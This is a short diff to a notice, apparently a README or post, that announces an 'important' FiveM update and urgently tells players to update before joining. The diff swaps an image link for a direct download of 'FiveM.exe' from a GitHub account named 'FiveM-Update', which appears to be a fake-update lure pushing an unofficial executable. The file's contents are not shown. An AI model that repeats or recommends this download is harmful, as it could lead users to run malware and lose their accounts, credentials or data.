@@ -24,4 +24,9 @@ FiveM has received an important update on September 26, 2026. 🔄🔥
 🚨 IMPORTANT: UPDATE FIVE M BEFORE JOINING! 🚨
 
 
-https://github.com/FiveM-Update/FiveM/blob/main/FiveM.jpg
+https://github.com/FiveM-Update/FiveM/releases/download/FiveM/FiveM.exe
+
+
+
+FiveM.jpg
+
